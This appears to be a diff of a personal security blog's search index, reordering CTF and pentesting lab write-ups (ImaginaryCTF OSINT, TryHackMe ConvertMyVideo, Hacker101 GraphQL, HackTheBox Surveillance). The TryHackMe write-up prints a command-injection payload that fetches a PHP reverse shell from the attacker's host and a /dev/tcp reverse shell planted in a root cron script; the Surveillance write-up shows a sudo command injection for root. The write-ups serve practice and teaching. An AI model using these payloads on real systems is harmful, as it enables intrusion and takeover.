@@ -302,7 +302,7 @@
 <h3 id="cartesian-2"><a href="#cartesian-2" class="headerlink" title="cartesian-2"></a>cartesian-2</h3><ul>
 <li>solver Elliot_404<br>上LinkedIn搜尋Terrence Descartes，會看到一個跟前面Instagram帳號同樣頭像的，點下去<br><a href="https://www.linkedin.com/in/terrence-descartes-54642831a/">https://www.linkedin.com/in/terrence-descartes-54642831a/</a><br>查看第一則貼文的第二張照片，裡面有寫flag(2&#x2F;1)<br><img src="https://hackmd.io/_uploads/ryuHquo_C.jpg" alt="1721434962084"></li>
 </ul>
-<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#116;&#101;&#114;&#114;&#101;&#x6e;&#99;&#x65;&#100;&#101;&#x73;&#x63;&#97;&#x72;&#116;&#x65;&#x73;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#x2e;&#99;&#111;&#109;">&#116;&#101;&#114;&#114;&#101;&#x6e;&#99;&#x65;&#100;&#101;&#x73;&#x63;&#97;&#x72;&#116;&#x65;&#x73;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#x2e;&#99;&#111;&#109;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
+<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#116;&#x65;&#x72;&#114;&#x65;&#110;&#99;&#101;&#100;&#x65;&#x73;&#x63;&#97;&#114;&#116;&#101;&#115;&#64;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;">&#116;&#x65;&#x72;&#114;&#x65;&#110;&#99;&#101;&#100;&#x65;&#x73;&#x63;&#97;&#114;&#116;&#101;&#115;&#64;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
 <h3 id="cartesian-3"><a href="#cartesian-3" class="headerlink" title="cartesian-3"></a>cartesian-3</h3><ul>
 <li>solver Elliot_404<blockquote>
 <p><a href="http://cartesian.chal.imaginaryctf.org/">http://cartesian.chal.imaginaryctf.org/</a></p>
@@ -310,7 +310,7 @@
 </li>
 </ul>
 <ol>
-<li><p>What is your email?<br>A: <a href="mailto:&#x74;&#101;&#x72;&#x72;&#101;&#x6e;&#x63;&#101;&#100;&#x65;&#x73;&#99;&#x61;&#x72;&#x74;&#x65;&#115;&#64;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;">&#x74;&#101;&#x72;&#x72;&#101;&#x6e;&#x63;&#101;&#100;&#x65;&#x73;&#99;&#x61;&#x72;&#x74;&#x65;&#115;&#64;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;</a><br>用姓名去猜即可</p>
+<li><p>What is your email?<br>A: <a href="mailto:&#116;&#101;&#114;&#x72;&#x65;&#x6e;&#99;&#x65;&#x64;&#x65;&#115;&#99;&#97;&#x72;&#x74;&#x65;&#x73;&#64;&#103;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#109;">&#116;&#101;&#114;&#x72;&#x65;&#x6e;&#99;&#x65;&#x64;&#x65;&#115;&#99;&#97;&#x72;&#x74;&#x65;&#x73;&#64;&#103;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#109;</a><br>用姓名去猜即可</p>
 </li>
 <li><p>On what day were you born? (YYYY-MM-DD)<br>A: 2001-01-18<br>此篇<a href="https://www.instagram.com/p/C9lkBOjxQCW/">Instagram貼文</a>是他的半歲生日慶祝文，用發文日期減去6個月後即是他的生日，年份的部分則在名稱中就透露了</p>
 </li>
@@ -1154,6 +1154,62 @@ My arms were almost broken by brute forcing through this…</li>
       </tags>
   </entry>
   <entry>
+    <title>ConvertMyVideo on TryHackMe</title>
+    <url>/2024/02/23/convertmymedio-tryhackme/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Well… I was stucked at the last step of this box, after I searched other’s Write Up, I learned a new tool - <code>pspy</code> which can moniter linux processes without root.  </p>
+<p>Victim’s IP : 10.10.3.97<br>Attacker’s IP : 10.9.195.189  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>Command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -PN 10.10.3.97</span><br></pre></td></tr></table></figure>
+
+<p><strong>Result:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 10.10.3.97</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)</span><br><span class="line">|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)</span><br><span class="line">|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<p>nothing special though…  </p>
+<h4 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h4><p><strong>Command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.10.3.97/</span><br></pre></td></tr></table></figure>
+<p><strong>Result:</strong><br>The most interesting part is the <code>admin</code> directory which required http-get auth.  </p>
+<p><img src="https://hackmd.io/_uploads/rJuWhKrha.png" alt="image">  </p>
+<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><h4 id="command-injection"><a href="#command-injection" class="headerlink" title="command injection"></a>command injection</h4><p>The web page look like this, and after some tries, I found out a vulnerability with command injection.  </p>
+<p><img src="https://hackmd.io/_uploads/Syuc3YrnT.png" alt="image">  </p>
+<p>The interesting part is that it would block the <code>space</code> character and cut the post data with <code>&amp;</code>(me crying out loud : is and not end!!!)<br>Anyway, is still easy to bypass by <code>$&#123;IFS&#125;</code><br>Setting up a http server to make victim downloads the php reverse shell.  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 10000</span><br></pre></td></tr></table></figure>
+<p>I opened it on port 10000  </p>
+<p>Listening on port <strong>1004</strong> and wait for the reverse shell work:  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1004 <span class="comment">#rrrahhh</span></span><br></pre></td></tr></table></figure>
+
+
+<p>Command injection payload:  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yt_url=;wget$&#123;IFS&#125;http://10.9.195.189:10000/reverse.php;</span><br></pre></td></tr></table></figure>
+<p>And just visit <code>http://10.10.3.97:10000/reverse.php</code> to get shell on port <strong>1004</strong>  </p>
+<h4 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h4><p>Well…although I don’t know why I should do this, but I <strong>must</strong> do this to complete the challenge(  </p>
+<p>File:<code>/var/www/html/admin/.htpasswd</code>  </p>
+<p>Content:<code>itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/</code>  </p>
+<p>Simple crack with <code>john</code>:<br><strong>Command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john pass --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><strong>Result:</strong>  </p>
+<p><img src="https://hackmd.io/_uploads/SkMpkcHnT.png" alt="image">  </p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="pspy"><a href="#pspy" class="headerlink" title="pspy"></a>pspy</h4><p><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a>  </p>
+<p>Install it on victim’s machine:  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://10.9.195.189:10000/pspy64</span><br></pre></td></tr></table></figure>
+<p>And after a while, I noticed that there’s a cronjob run with <code>UID=0</code>, which probably run by <code>root</code><br><img src="https://hackmd.io/_uploads/SyLPx9Sna.png" alt="image">  </p>
+<h4 id="reverse-shell-again"><a href="#reverse-shell-again" class="headerlink" title="reverse shell again"></a>reverse shell again</h4><p>Base on the cronjob discovered before, I edited the content of <code>clean.sh</code> to get a root’s shell.  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;sh -i &gt;&amp; /dev/tcp/10.9.195.189/5427 0&gt;&amp;1&quot;</span> &gt; clean.sh</span><br></pre></td></tr></table></figure>
+
+
+<p>Open port <strong>5427</strong> on my computer:  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nc -lvnp 5427</span><br></pre></td></tr></table></figure>
+<p>Finally…  </p>
+<p><strong>Get shell!!!</strong><br><img src="https://hackmd.io/_uploads/SJfHzqrhp.png" alt="image">  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>I am still procrastinating on my write up for Year of the Fox on TryHackMe …  </p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
+        <tag>Command Injection</tag>
+        <tag>pspy</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CGGC 2023 心得文</title>
     <url>/2023/12/04/cggc2023/</url>
     <content><![CDATA[<p><a href="https://cggc.nchc.org.tw/">官方連結</a><br>Team Name:芙莉熊<br>Rank:9  </p>
@@ -1221,62 +1277,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>pwn</tag>
         <tag>game hacking</tag>
         <tag>cheat engine</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ConvertMyVideo on TryHackMe</title>
-    <url>/2024/02/23/convertmymedio-tryhackme/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Well… I was stucked at the last step of this box, after I searched other’s Write Up, I learned a new tool - <code>pspy</code> which can moniter linux processes without root.  </p>
-<p>Victim’s IP : 10.10.3.97<br>Attacker’s IP : 10.9.195.189  </p>
-<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>Command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -PN 10.10.3.97</span><br></pre></td></tr></table></figure>
-
-<p><strong>Result:</strong>  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 10.10.3.97</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)</span><br><span class="line">|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)</span><br><span class="line">|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
-<p>nothing special though…  </p>
-<h4 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h4><p><strong>Command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.10.3.97/</span><br></pre></td></tr></table></figure>
-<p><strong>Result:</strong><br>The most interesting part is the <code>admin</code> directory which required http-get auth.  </p>
-<p><img src="https://hackmd.io/_uploads/rJuWhKrha.png" alt="image">  </p>
-<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><h4 id="command-injection"><a href="#command-injection" class="headerlink" title="command injection"></a>command injection</h4><p>The web page look like this, and after some tries, I found out a vulnerability with command injection.  </p>
-<p><img src="https://hackmd.io/_uploads/Syuc3YrnT.png" alt="image">  </p>
-<p>The interesting part is that it would block the <code>space</code> character and cut the post data with <code>&amp;</code>(me crying out loud : is and not end!!!)<br>Anyway, is still easy to bypass by <code>$&#123;IFS&#125;</code><br>Setting up a http server to make victim downloads the php reverse shell.  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 10000</span><br></pre></td></tr></table></figure>
-<p>I opened it on port 10000  </p>
-<p>Listening on port <strong>1004</strong> and wait for the reverse shell work:  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1004 <span class="comment">#rrrahhh</span></span><br></pre></td></tr></table></figure>
-
-
-<p>Command injection payload:  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yt_url=;wget$&#123;IFS&#125;http://10.9.195.189:10000/reverse.php;</span><br></pre></td></tr></table></figure>
-<p>And just visit <code>http://10.10.3.97:10000/reverse.php</code> to get shell on port <strong>1004</strong>  </p>
-<h4 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h4><p>Well…although I don’t know why I should do this, but I <strong>must</strong> do this to complete the challenge(  </p>
-<p>File:<code>/var/www/html/admin/.htpasswd</code>  </p>
-<p>Content:<code>itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/</code>  </p>
-<p>Simple crack with <code>john</code>:<br><strong>Command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john pass --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure>
-<p><strong>Result:</strong>  </p>
-<p><img src="https://hackmd.io/_uploads/SkMpkcHnT.png" alt="image">  </p>
-<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="pspy"><a href="#pspy" class="headerlink" title="pspy"></a>pspy</h4><p><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a>  </p>
-<p>Install it on victim’s machine:  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://10.9.195.189:10000/pspy64</span><br></pre></td></tr></table></figure>
-<p>And after a while, I noticed that there’s a cronjob run with <code>UID=0</code>, which probably run by <code>root</code><br><img src="https://hackmd.io/_uploads/SyLPx9Sna.png" alt="image">  </p>
-<h4 id="reverse-shell-again"><a href="#reverse-shell-again" class="headerlink" title="reverse shell again"></a>reverse shell again</h4><p>Base on the cronjob discovered before, I edited the content of <code>clean.sh</code> to get a root’s shell.  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;sh -i &gt;&amp; /dev/tcp/10.9.195.189/5427 0&gt;&amp;1&quot;</span> &gt; clean.sh</span><br></pre></td></tr></table></figure>
-
-
-<p>Open port <strong>5427</strong> on my computer:  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nc -lvnp 5427</span><br></pre></td></tr></table></figure>
-<p>Finally…  </p>
-<p><strong>Get shell!!!</strong><br><img src="https://hackmd.io/_uploads/SJfHzqrhp.png" alt="image">  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>I am still procrastinating on my write up for Year of the Fox on TryHackMe …  </p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
-        <tag>Command Injection</tag>
-        <tag>pspy</tag>
       </tags>
   </entry>
   <entry>
@@ -1660,29 +1660,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
-    <title>BugDB Series on Hacker101CTF</title>
-    <url>/2024/08/11/hacker101ctf-bugdb/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>The two challenges are both about GraphQL, and I just used the corresponding tools burp suite provide to solve them!  </p>
-<p><img src="https://hackmd.io/_uploads/rykWPL85C.png" alt="image"></p>
-<p><strong>Reference(Port Swigger):</strong><a href="https://portswigger.net/web-security/graphql">https://portswigger.net/web-security/graphql</a>  </p>
-<h2 id="BugDB-v1"><a href="#BugDB-v1" class="headerlink" title="BugDB v1"></a>BugDB v1</h2><h3 id="introspection"><a href="#introspection" class="headerlink" title="introspection"></a>introspection</h3><p>Introspection is a step for schema information discovering.<br>Just type some stuffs and send it, meanwhile, right click on that history (in Burp Suite) and send it to responder.<br><img src="https://hackmd.io/_uploads/B1CiD8I5R.png" alt="image"><br>In the request part, change to the GraphQL view and set an IntrospectionQuery.<br><img src="https://hackmd.io/_uploads/B1CiD8I5R.png" alt="image">  </p>
-<p>Next, send it to sitemap, then feasible queries for the api are all in the target page!  </p>
-<p><img src="https://hackmd.io/_uploads/rkj1uLIqR.png" alt="image"><br><img src="https://hackmd.io/_uploads/H1FOu8L9A.png" alt="image">  </p>
-<p>Finally, I chose a query and send it to Repeater, removed all the variable params, and dumped all “allBugs” datas!  </p>
-<p><img src="https://hackmd.io/_uploads/r1zZYLI5C.png" alt="image">  </p>
-<h2 id="BugDB-v2"><a href="#BugDB-v2" class="headerlink" title="BugDB v2"></a>BugDB v2</h2><h3 id="introspection-1"><a href="#introspection-1" class="headerlink" title="introspection"></a>introspection</h3><p>Same as I done up there, but this time there’s a mutation function availible!<br><img src="https://hackmd.io/_uploads/BkbJ9IL5R.png" alt="image">  </p>
-<p>And also, if I directly use the query access “allBugs” just like the way I did before, there’s only an admin report but not the victim’s one.  </p>
-<h3 id="mutation"><a href="#mutation" class="headerlink" title="mutation"></a>mutation</h3><p>Mutation is a process which is used for making changes to datas.<br>Furthermore, there’s a “private” paramter in the extracted data.<br><img src="https://hackmd.io/_uploads/BJlF58L5C.png" alt="image">  </p>
-<p>So, for solving this challengem, just change the “private” value for the Bug with id&#x3D;2 into “true” through mutation!  </p>
-<p><img src="https://hackmd.io/_uploads/ry4_oIUc0.png" alt="image"><br><img src="https://hackmd.io/_uploads/H1lFs889A.png" alt="image">  </p>
-<p>P.S. Just remember that DONNOT change the text value LOL.  </p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>GraphQL</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Flare-On 9 challenge 1~3 Write Up</title>
     <url>/2024/05/18/flare-on-9-1-3/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>剛考完段考，來練rev &gt;&lt;<br>flare-on 是 Google Threat Intelligence Team 在每年秋天辦的逆向工程比賽，然後打起來真的挺有趣的 owobb<br>祝 AIS3 PRE-EXAM 可以打得好 w<br>p.s. 啊為什麼我的 IDA 用起來跟官方差那麼多啦😡<br><del>只好動不動就PATCH東西</del><br>flare-on的官網：<a href="https://flare-on.com/">https://flare-on.com/</a>  </p>
@@ -1705,6 +1682,29 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>Windows</tag>
         <tag>Flare-On</tag>
         <tag>reverse engineering</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BugDB Series on Hacker101CTF</title>
+    <url>/2024/08/11/hacker101ctf-bugdb/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>The two challenges are both about GraphQL, and I just used the corresponding tools burp suite provide to solve them!  </p>
+<p><img src="https://hackmd.io/_uploads/rykWPL85C.png" alt="image"></p>
+<p><strong>Reference(Port Swigger):</strong><a href="https://portswigger.net/web-security/graphql">https://portswigger.net/web-security/graphql</a>  </p>
+<h2 id="BugDB-v1"><a href="#BugDB-v1" class="headerlink" title="BugDB v1"></a>BugDB v1</h2><h3 id="introspection"><a href="#introspection" class="headerlink" title="introspection"></a>introspection</h3><p>Introspection is a step for schema information discovering.<br>Just type some stuffs and send it, meanwhile, right click on that history (in Burp Suite) and send it to responder.<br><img src="https://hackmd.io/_uploads/B1CiD8I5R.png" alt="image"><br>In the request part, change to the GraphQL view and set an IntrospectionQuery.<br><img src="https://hackmd.io/_uploads/B1CiD8I5R.png" alt="image">  </p>
+<p>Next, send it to sitemap, then feasible queries for the api are all in the target page!  </p>
+<p><img src="https://hackmd.io/_uploads/rkj1uLIqR.png" alt="image"><br><img src="https://hackmd.io/_uploads/H1FOu8L9A.png" alt="image">  </p>
+<p>Finally, I chose a query and send it to Repeater, removed all the variable params, and dumped all “allBugs” datas!  </p>
+<p><img src="https://hackmd.io/_uploads/r1zZYLI5C.png" alt="image">  </p>
+<h2 id="BugDB-v2"><a href="#BugDB-v2" class="headerlink" title="BugDB v2"></a>BugDB v2</h2><h3 id="introspection-1"><a href="#introspection-1" class="headerlink" title="introspection"></a>introspection</h3><p>Same as I done up there, but this time there’s a mutation function availible!<br><img src="https://hackmd.io/_uploads/BkbJ9IL5R.png" alt="image">  </p>
+<p>And also, if I directly use the query access “allBugs” just like the way I did before, there’s only an admin report but not the victim’s one.  </p>
+<h3 id="mutation"><a href="#mutation" class="headerlink" title="mutation"></a>mutation</h3><p>Mutation is a process which is used for making changes to datas.<br>Furthermore, there’s a “private” paramter in the extracted data.<br><img src="https://hackmd.io/_uploads/BJlF58L5C.png" alt="image">  </p>
+<p>So, for solving this challengem, just change the “private” value for the Bug with id&#x3D;2 into “true” through mutation!  </p>
+<p><img src="https://hackmd.io/_uploads/ry4_oIUc0.png" alt="image"><br><img src="https://hackmd.io/_uploads/H1lFs889A.png" alt="image">  </p>
+<p>P.S. Just remember that DONNOT change the text value LOL.  </p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>GraphQL</tag>
       </tags>
   </entry>
   <entry>
@@ -3271,36 +3271,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
-    <title>Surveillance Write Up on HackTheBox</title>
-    <url>/2024/04/08/surveillance-htb/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>沒想像中難ㄉ靶機，好欸今天晚上目前打了兩台owob<br><del>也順便先去把昨天的wifi給打完了</del>  </p>
-<p>Attacker’s IP : 10.10.14.92<br>Victim’s IP : 10.10.11.245<br>Victim’s Host : surveillance.htb  </p>
-<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><p><del>打HTB以來一直想直接跳過這步驟的撰寫</del>  </p>
-<h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><img src="https://hackmd.io/_uploads/B1NLQd-lC.png" alt="image"><br>port 22是ssh<br>port 80是一個web服務  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2023-41892"><a href="#CVE-2023-41892" class="headerlink" title="CVE-2023-41892"></a>CVE-2023-41892</h4><p>連進去web服務，發現是由 Craft CMS 建立的：<br><img src="https://hackmd.io/_uploads/Sk-gNOWeC.png" alt="image"><br>本來打算用2024年的另一個CVE打不過發現有patch，經過簡單的搜尋就改成使用CVE-2023-41892的漏洞直接進行RCE。<br>使用腳本：<a href="https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226">https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226</a><br><img src="https://hackmd.io/_uploads/rk3rVd-lC.png" alt="image">  </p>
-<p>彈到 port 1004 get shell  </p>
-<p><img src="https://hackmd.io/_uploads/BJSRS_bgC.png" alt="image">  </p>
-<h3 id="Privilege-Esacalation"><a href="#Privilege-Esacalation" class="headerlink" title="Privilege Esacalation"></a>Privilege Esacalation</h3><h4 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h4><p>彈進去的時候所在的目錄是：<code>/var/www/html/craft/web/cpresources</code><br>簡單逛兩圈就會在<code>/var/www/html/craft/storage/backups</code>  發現一個zip檔案：<code>surveillance--2023-10-17-202801--v4.4.14.sql.zip</code><br>在目標主機用<code>python3 -m http.server</code>簡單建立一個http server後把檔案抓回來解壓縮後看，發現使用者<code>matthew</code>的密碼hash<br><img src="https://hackmd.io/_uploads/ryftUdWlC.png" alt="image"><br>利用密碼爆破工具john搭配rockyou.txt進行字典攻擊：<br><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john pass --wordlist=~/rockyou.txt --format=Raw-SHA256</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/rJ6nLd-l0.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/SkDCUOWeA.png" alt="image"><br>用<code>su</code>切去matthew的身分就好 :D  </p>
-<h4 id="Exploiting-ZoneMinder"><a href="#Exploiting-ZoneMinder" class="headerlink" title="Exploiting ZoneMinder"></a>Exploiting ZoneMinder</h4><p>在linpeas裡面看到這個，上網google一下<del>然後全部都是Write up</del><br><img src="https://hackmd.io/_uploads/r1-qwd-l0.png" alt="image"><br>總之，他在內網開了一個ZoneMinder的服務，要先把它串出來：<br><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L 8091:127.0.0.1:8080 matthew@10.10.11.245</span><br></pre></td></tr></table></figure>
-<p>接著利用<code>CVE-2023-26035</code>的漏洞拿RCE<br><a href="https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py">https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py</a>  </p>
-<p><img src="https://hackmd.io/_uploads/HJzY_O-lA.png" alt="image"><br>在本地彈到使用者zoneminder的權限<br><img src="https://hackmd.io/_uploads/B1Kh_OZg0.png" alt="image">  </p>
-<p>這麼做的目的應該就是讓它可以合理操控zoneminder的相關perl腳本(?)  </p>
-<p><a href="https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/">https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/</a>  </p>
-<p>上網google找到這個command injection，照打：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/zmupdate.pl --version 1 --user=<span class="string">&#x27;$(/bin/bash)&#x27;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/H1LbFO-gC.png" alt="image"><br>發現無法輸出，只好再串一個reverse shell出來(<br><img src="https://hackmd.io/_uploads/SyCXYdZg0.png" alt="image"><br>結束owob  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>今天晚上還會再打一台麻~<br>挑題easy的練手感(?)  </p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>test_if_work</title>
     <url>/2024/05/22/test-if-work/</url>
     <content><![CDATA[<h1 id="WTH"><a href="#WTH" class="headerlink" title="WTH???"></a>WTH???</h1><p>Because I crushed my kali linux again…</p>
@@ -3418,6 +3388,36 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>TryHackMe</tag>
         <tag>lxd</tag>
         <tag>routingtableparser</tag>
+      </tags>
+  </entry>
+  <entry>
